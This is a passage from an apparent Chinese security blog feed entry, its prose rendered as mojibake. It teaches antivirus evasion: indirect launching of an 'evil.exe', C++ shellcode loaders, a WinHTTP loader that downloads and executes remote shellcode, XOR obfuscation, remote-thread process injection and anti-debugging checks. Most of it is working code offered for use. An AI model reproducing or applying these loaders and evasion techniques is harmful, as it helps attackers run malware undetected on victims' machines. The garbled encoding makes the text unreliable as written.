ç­‰å‘½ä»¤å‘ç°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726190433565.png" alt="image-20210726190433565"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WINDOWS-æ—¥å¿—&quot;&gt;&lt;a href=&quot;#WINDOWS-æ—¥å¿—&quot; class=&quot;headerlink&quot; title=&quot;WINDOWS æ—¥å¿—&quot;&gt;&lt;/a&gt;WINDOWS æ—¥å¿—&lt;/h1&gt;&lt;p&gt;Windowsæ—¥å¿—æœ‰è®¸å¤šç»†åˆ†ç±»ï¼š&lt;br&gt;windowsäº‹ä»¶æ—¥å¿—ï¼ŒIISæ—¥å¿—ï¼Œ</summary>
      
    
    
    
    
    <category term="ç³»ç»Ÿç›¸å…³ä¸å…æ€" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>åŸºç¡€å…æ€æ‰‹æ³•æš´é£å¸å…¥</title>
    <link href="http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/"/>
    <id>http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/</id>
    <published>2021-09-03T13:08:31.882Z</published>
    <updated>2021-09-03T13:18:40.381Z</updated>
    
    <content type="html"><![CDATA[<p>å‰é¢çš„è¯:â€å…æ€ä¸€èˆ¬éƒ½æ˜¯é ç»„åˆæ‹³â€</p><h1 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h1><h3 id="åŠ å£³"><a href="#åŠ å£³" class="headerlink" title="åŠ å£³"></a>åŠ å£³</h3><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚å¯ä»¥è‡ªå†™åŠ å£³å™¨ç­‰ç­‰</p><h3 id="æ·»åŠ æ•°å­—ç­¾å"><a href="#æ·»åŠ æ•°å­—ç­¾å" class="headerlink" title="æ·»åŠ æ•°å­—ç­¾å"></a>æ·»åŠ æ•°å­—ç­¾å</h3><p>ä¸åŒçš„æ€è½¯å¯¹æ•°å­—ç­¾åçš„æ•æ„Ÿæ€§ä¸åŒï¼Œæœ‰äº›æ€è½¯å¯èƒ½åªæ£€æŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰æ•°å­—ç­¾åå°±è¿‡äº†ï¼Œæœ‰äº›æ€è½¯å¯èƒ½è¦å»éªŒè¯ä¸€ä¸‹æ•°å­—ç­¾åçš„æ­£ç¡®æ€§ï¼Œæœ‰äº›å¯èƒ½ç®¡éƒ½ä¸ç®¡æ•°å­—ç­¾åã€‚åªèƒ½è¯´æ·»åŠ æ•°å­—ç­¾åèƒ½ç¨å¾®æå‡ä¸€ä¸‹exeçš„å…æ€å‡ ç‡ã€‚</p><h3 id="é—´æ¥è¿è¡Œexe"><a href="#é—´æ¥è¿è¡Œexe" class="headerlink" title="é—´æ¥è¿è¡Œexe"></a>é—´æ¥è¿è¡Œexe</h3><p>å¹³æ—¶æˆ‘ä»¬è¿è¡Œä¸€ä¸ªexeï¼š cmd /c c:\a.exe  ä½†è¿™æ ·å®¹æ˜“è¢«æ€æˆ–è€…å‘½ä»¤è¢«banã€‚æ‰€æœ‰å°±æœ‰ä¸€äº›é—´æ¥è¿è¡Œexeçš„æ–¹æ³•</p><h4 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h4><p>forfilesæ˜¯ä¸€ä¸ªç”¨äºæ‰¹å¤„ç†çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒåœ¨æ‰¾åˆ°æ–‡ä»¶åä¼šæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤. </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;p æŒ‡å®šæœç´¢æ–‡ä»¶çš„ç›®å½• &#x2F;m æŒ‡å®šæœç´¢å…³é”®è¯ &#x2F;c æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c c:\tmp\evil.exe  &#x2F;&#x2F;evil.exeä¼šæˆä¸ºforfiles.exeçš„å­è¿›ç¨‹</span><br></pre></td></tr></table></figure><h4 id="pcalua"><a href="#pcalua" class="headerlink" title="pcalua"></a>pcalua</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcalua -a c:\tmp\evil.exe  &#x2F;&#x2F;evil.exeä¸ä¼šæˆä¸ºå­è¿›ç¨‹</span><br></pre></td></tr></table></figure><h4 id="cmd-Hijack"><a href="#cmd-Hijack" class="headerlink" title="cmd Hijack"></a>cmd Hijack</h4><p>ä¸‹é¢å‘½ä»¤å°†å¼¹è®¡ç®—å™¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">cmd.exe &#x2F;c &quot;ping ;a.exe; 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">ping ;a.exe 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br></pre></td></tr></table></figure><h4 id="conhost"><a href="#conhost" class="headerlink" title="conhost"></a>conhost</h4><p>å¤§äºwin7å¯ç”¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conhost c:\windows\system32\calc.exe</span><br><span class="line">conhost adsadas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br><span class="line"></span><br><span class="line">ä»¥ä¸‹æŒ‡ä»¤win10æŸäº›ç‰ˆæœ¬æ— æ³•ä½¿ç”¨</span><br><span class="line">conhost &quot;asddas c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h4 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explorer.exe c:\windows\system32\calc.exe</span><br><span class="line">explorer asdsadasd,&quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h3 id="shellcodeå¤„ç†"><a href="#shellcodeå¤„ç†" class="headerlink" title="shellcodeå¤„ç†"></a>shellcodeå¤„ç†</h3><h4 id="æŒ‡é’ˆæ‰§è¡Œ-ç”³è¯·å†…å­˜åŠ¨æ€åŠ è½½shellcode"><a href="#æŒ‡é’ˆæ‰§è¡Œ-ç”³è¯·å†…å­˜åŠ¨æ€åŠ è½½shellcode" class="headerlink" title="æŒ‡é’ˆæ‰§è¡Œ+ç”³è¯·å†…å­˜åŠ¨æ€åŠ è½½shellcode"></a>æŒ‡é’ˆæ‰§è¡Œ+ç”³è¯·å†…å­˜åŠ¨æ€åŠ è½½shellcode</h4><p>é¦–å…ˆä»cobalt strikeä¸Šç”Ÿæˆæ‹¿åˆ°shellcodeç”¨ä½œæœ¬æ¬¡æµ‹è¯•ã€‚<br>ç„¶åé€šè¿‡ä¸‹é¢çš„ä»£ç ï¼Œç›´æ¥æ‰§è¡Œå†™æ­»åœ¨ç¨‹åºé‡Œçš„shellcodeã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145713.png" alt="QQæˆªå›¾20210217145713"></p><p>å¯ä»¥çœ‹è§ï¼Œè¿˜æ˜¯å¾ˆæ‹‰è·¨çš„ã€‚</p><h4 id="å†…è”æ±‡ç¼–åŠ è½½shellcode"><a href="#å†…è”æ±‡ç¼–åŠ è½½shellcode" class="headerlink" title="å†…è”æ±‡ç¼–åŠ è½½shellcode"></a>å†…è”æ±‡ç¼–åŠ è½½shellcode</h4><p>c++æœ‰å¼ºå¤§çš„å†…è”æ±‡ç¼–åŠŸèƒ½ï¼Œä¸Šæ¬¡å†™å£³çš„æ—¶å€™å°±æ„Ÿå—äº†ä¸€ç•ªã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–ä»£ç åŠ è½½shellcode.é¡ºä¾¿åŠ èŠ±ä»€ä¹ˆçš„ï¼Œéƒ½å¯ä»¥å¼„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">_asm &#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">jmp eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145723.png" alt="QQæˆªå›¾20210217145723"></p><p>è¿˜æ˜¯è›®æ‹‰è·¨çš„ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰åŠ èŠ±ã€‚</p><h4 id="HTTPåè®®è¿œç¨‹è¯»å–shellcode"><a href="#HTTPåè®®è¿œç¨‹è¯»å–shellcode" class="headerlink" title="HTTPåè®®è¿œç¨‹è¯»å–shellcode"></a>HTTPåè®®è¿œç¨‹è¯»å–shellcode</h4><p>è¿™æ¬¡æˆ‘ä»¬ä¸æŠŠshellcodeå†™æ­»åœ¨ç¨‹åºä¹‹ä¸­ï¼Œè€Œæ˜¯é€šè¿‡ç¨‹åºå‘èµ·httpè¯·æ±‚å‘å¤–ç•Œè·å¾—shellcodeå¹¶æ‰§è¡Œã€‚<br>è¿™é‡Œæ¶‰åŠåˆ°winhttp.hçš„ä¸€äº›å‡½æ•°çš„ä½¿ç”¨ã€‚</p><p>æºç å€Ÿç”¨ä¸€ä¸‹ å¿ çš„ä»£ç ã€‚å®ƒçš„ä»£ç æ˜¯ç›´æ¥æŠŠshellcodeçš„åå…­è¿›åˆ¶ä»¥å­—ç¬¦ä¸²å½¢å¼ç›´æ¥æ”¾åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚åƒè¿™æ ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145737.png" alt="QQæˆªå›¾20210217145737"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize &#x3D; 0;</span><br><span class="line">    DWORD dwDownloaded &#x3D; 0;</span><br><span class="line">    LPSTR pszOutBuffer &#x3D; NULL;</span><br><span class="line">    HINTERNET  hSession &#x3D; NULL,</span><br><span class="line">        hConnect &#x3D; NULL,</span><br><span class="line">        hRequest &#x3D; NULL;</span><br><span class="line">    BOOL  bResults &#x3D; FALSE;</span><br><span class="line">    hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">    if (hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;;</span><br><span class="line">    SIZE_T len &#x3D; lstrlenW(header);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">    if (hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;;</span><br><span class="line">        const void *ss &#x3D; (const char *)data.c_str();</span><br><span class="line">        bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);</span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Check for available data.</span><br><span class="line">            dwSize &#x3D; 0;</span><br><span class="line">            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!dwSize)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer &#x3D; new char[dwSize + 1];</span><br><span class="line"></span><br><span class="line">            if (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Out of memory\n&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ZeroMemory(pszOutBuffer, dwSize + 1);</span><br><span class="line"></span><br><span class="line">            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ok&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;char ShellCode[1024];</span><br><span class="line">            int code_length &#x3D; strlen(pszOutBuffer);</span><br><span class="line">            char* ShellCode &#x3D; (char*)calloc(code_length  &#x2F;2 , sizeof(unsigned char));</span><br><span class="line"></span><br><span class="line">            for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123;</span><br><span class="line">                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);</span><br><span class="line">                pszOutBuffer +&#x3D; 2;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%s&quot;, ShellCode);</span><br><span class="line">            &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer);</span><br><span class="line">            void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            memcpy(exec, ShellCode, sizeof ShellCode);</span><br><span class="line">            ((void(*)())exec)();</span><br><span class="line">            delete[] pszOutBuffer;</span><br><span class="line">            if (!dwDownloaded)</span><br><span class="line">                break;</span><br><span class="line">        &#125; while (dwSize &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">    if (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    if (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    if (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹ä¾¿æ˜¯:</p><p>1.é€šè¿‡winhttpä¸­çš„å‡½æ•°ï¼Œä»¥HTTPçš„æ–¹æ³•è·å–è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„shellcodeï¼ˆæ­¤æ—¶shellcodeåœ¨å†…å­˜ä¸­æ˜¯æŒ‰ç…§ç¼–ç ç»“æœå­˜å‚¨çš„ï¼Œå¦‚ä¸‹å›¾ï¼Œå·¦è¾¹æ˜¯å†…å­˜åŸæ–‡ï¼Œå³è¾¹æ˜¯å†…å­˜è§£ç ï¼ˆshellcodeï¼‰ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145818.png" alt="QQæˆªå›¾20210217145818"></p><p>2.å¼€è¾Ÿä¸€æ®µå†…å­˜ï¼Œç„¶åé€šè¿‡sscanfç­‰æ–¹æ³•è¯»å–å­˜å‚¨shellcodeå˜é‡çš„å†…å®¹ï¼Œå°†å†…å­˜è§£ç ä¿¡æ¯å½•å…¥æ–°çš„å†…å­˜ç©ºé—´,ä½¿shellcodeå­˜åœ¨äºå†…å­˜ä¸­<br>3.æ‰§è¡Œshellcodeï¼Œå¯ä»¥ç”¨æŒ‡é’ˆæ‰§è¡Œç­‰æ–¹æ³•æ‰§è¡Œã€‚</p><h4 id="ä½¿ç”¨åŠ è½½å™¨åŠ è½½shellcode"><a href="#ä½¿ç”¨åŠ è½½å™¨åŠ è½½shellcode" class="headerlink" title="ä½¿ç”¨åŠ è½½å™¨åŠ è½½shellcode"></a>ä½¿ç”¨åŠ è½½å™¨åŠ è½½shellcode</h4><h5 id="shellcode-launcher-åŠ è½½å™¨"><a href="#shellcode-launcher-åŠ è½½å™¨" class="headerlink" title="shellcode_ launcher åŠ è½½å™¨"></a>shellcode_ launcher åŠ è½½å™¨</h5><p><a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p>ç”¨msfæˆ–è€…csç”Ÿæˆrawå½¢å¼shellcodeï¼Œç„¶åä½¿ç”¨è¿™ä¸ªåŠ è½½å™¨åŠ è½½ä¸€ä¸‹å°±è¡Œäº†.<br>åƒè¿™æ · shellcode_launcher.exe -i C:\payload32.bin<br>shellcode_ launcher åœ¨virustotalä¸ŠæŠ¥æ¯’ç‡ä¹Ÿæ˜¯å¾ˆé«˜å¾ˆé«˜äº†â€¦</p><h5 id="SSI-åŠ è½½å™¨"><a href="#SSI-åŠ è½½å™¨" class="headerlink" title="SSI åŠ è½½å™¨"></a>SSI åŠ è½½å™¨</h5><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p> csç”Ÿæˆcå½¢å¼shellcodeï¼Œç„¶åå»é™¤\xï¼Œå†æ‹¿ç»™ssiåŠ è½½å™¨åŠ è½½,åƒè¿™æ ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145832.png" alt="QQæˆªå›¾20210217145832"></p><p>ssi.exe shellcode å³å¯å®ŒæˆåŠ è½½</p><p>ssiåœ¨virustotalä¸ŠæŠ¥æ¯’ç‡ä¹Ÿæ˜¯éå¸¸é«˜..</p><h5 id="è‡ªå†™åŠ è½½å™¨"><a href="#è‡ªå†™åŠ è½½å™¨" class="headerlink" title="è‡ªå†™åŠ è½½å™¨"></a>è‡ªå†™åŠ è½½å™¨</h5><p>ssiæºç å¾ˆç®€å•å¤§å®¶å¯ä»¥å‚è€ƒå†™ä¸€ä¸‹</p><h4 id="shellcodeå˜å½¢"><a href="#shellcodeå˜å½¢" class="headerlink" title="shellcodeå˜å½¢"></a>shellcodeå˜å½¢</h4><p>å¤§æ€è·¯å°±æ˜¯æŠŠshellcodeæ··æ·†åï¼Œæ”¾å…¥åŠ è½½å™¨åŠ è½½è¿è¡Œã€‚<br>å…¶ç»†åˆ†æ€è·¯å°±åŒ…æ‹¬æ€ä¹ˆæŠŠshellcodeè¿›è¡Œæ··æ·†äº†ï¼Œç®€å•çš„æœ‰XOR,BASE64ï¼Œå¤æ‚ä¸€ç‚¹çš„æœ‰AESç­‰ã€‚<br>è¿™é‡Œå°±åªè¯´è¯´xorã€‚<br>é¦–å…ˆæˆ‘ä»¬å¾—å‡†å¤‡ä¸€ä¸ªç¨‹åºå°†shellcodeè¿›è¡Œæ··æ·†ã€‚å›¾æ–¹ä¾¿å°±æ‹¿pythonå†™ä¹Ÿæ˜¯è›®ä¸é”™çš„ã€‚<br>éšä¾¿å†™äº†ä¸€ä¸ªã€‚æ•ˆæœçœŸä¸æˆ³ï¼ˆè™½ç„¶ä¸Šä¼ äº†vtè¿‡ä¸¤å¤©å°±è‚¯å®šä¸èƒ½ç”¨äº†)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145855.png" alt="QQæˆªå›¾20210217145855"></p><p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p><h4 id="shellcodeæ³¨å…¥è¿›ç¨‹å†…å­˜"><a href="#shellcodeæ³¨å…¥è¿›ç¨‹å†…å­˜" class="headerlink" title="shellcodeæ³¨å…¥è¿›ç¨‹å†…å­˜"></a>shellcodeæ³¨å…¥è¿›ç¨‹å†…å­˜</h4><h5 id="æ³¨å…¥å·²æœ‰è¿›ç¨‹"><a href="#æ³¨å…¥å·²æœ‰è¿›ç¨‹" class="headerlink" title="æ³¨å…¥å·²æœ‰è¿›ç¨‹"></a>æ³¨å…¥å·²æœ‰è¿›ç¨‹</h5><p>å¤§è‡´é€»è¾‘:OpenProcessè·å¾—è¿›ç¨‹å¥æŸ„-&gt;VirtualAllocExåœ¨è¿›ç¨‹ä¸­å¼€è¾Ÿä¸€æ®µå†…å­˜ç©ºé—´-&gt;WriteProcessMemoryå‘åˆšåˆšå¼€è¾Ÿçš„å†…å­˜ç©ºé—´ä¸­å†™å…¥shellcode-&gt;CreateRemoteThreadä¸ºåˆšåˆšå†™å…¥çš„shellcodeåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">DWORD pid &#x3D; 25388;</span><br><span class="line">HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">if (!Proc) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">if (buffer) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœ:è™½ç„¶ä¹Ÿå¾ˆæ‹‰ï¼Œä½†æ˜¯é™æ€è¿‡äº†è¶‹åŠ¿æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145906.png" alt="QQæˆªå›¾20210217145906"></p><h3 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h3><p>å¯ä»¥é€šè¿‡åè°ƒè¯•æ¥è§„é¿æ€è½¯æ£€æµ‹ï¼Œæ‹–æ…¢é€†å‘å·¥ç¨‹å¸ˆåˆ†æé€Ÿåº¦ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½æé«˜è¢«åˆ¤ä¸ºæ¶æ„æ–‡ä»¶çš„æ¦‚ç‡ã€‚</p><h5 id="ç›´æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè°ƒè¯•çŠ¶æ€"><a href="#ç›´æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè°ƒè¯•çŠ¶æ€" class="headerlink" title="ç›´æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè°ƒè¯•çŠ¶æ€"></a>ç›´æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè°ƒè¯•çŠ¶æ€</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (IsDebuggerPresent()) return FALSE;</span><br><span class="line"></span><br><span class="line">PPEB pPEB &#x3D; (PPEB)__readgsqword(0x60);</span><br><span class="line">if (pPEB-&gt;BeingDebugged) return;</span><br><span class="line"></span><br><span class="line">BOOL ret;  </span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">return ret;  </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NtQueryInformationProcess</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªå‡½æ•°ç”¨æ¥è·å–æŸè¿›ç¨‹çš„ä¿¡æ¯ã€‚</span><br><span class="line">éœ€è¦åŠ¨æ€é“¾æ¥åº“ #pragma comment(lib,&quot;ntdll&quot;)</span><br><span class="line">å½“ç„¶ä¹Ÿå¯ä»¥ç”¨GetProcAddressåŠ¨æ€è·å–è¿™ä¸ªå‡½æ•°ã€‚</span><br><span class="line">è¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šè¿›ç¨‹å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿›ç¨‹çš„ç‰¹å®šç»“æ„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è·å–è¿”å›å€¼ï¼Œç¬¬å››ä¸ªå‚æ•°æ˜¯è¿”å›å€¼ç¼“å†²åŒºå¤§å°ï¼Œç¬¬äº”ä¸ªå¡«NULL</span><br><span class="line">å…¶ä¸­ä¸åè°ƒè¯•æœ‰å…³çš„æˆå‘˜æœ‰ProcessDebugPort(0x7)ã€ProcessDebugObjectHandle(0x1E)å’ŒProcessDebugFlags(0x1F)</span><br><span class="line">ProcessDebugPortå‚æ•°ï¼Œè‹¥æ²¡åœ¨è°ƒè¯•ä¸­ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›0ï¼Œè‹¥åœ¨è°ƒè¯•ä¸­åˆ™è¿”å›å¯¹åº”çš„è°ƒè¯•ç«¯å£</span><br><span class="line">å…¶ä»–å‚æ•°ä¹Ÿç±»ä¼¼</span><br><span class="line"></span><br><span class="line">çœ‹é›ªä¸Šhoujingyiå¸ˆå‚…çš„æ¼”ç¤ºä»£ç </span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    int debugPort &#x3D; 0;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);  </span><br><span class="line">    return debugPort !&#x3D; 0;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    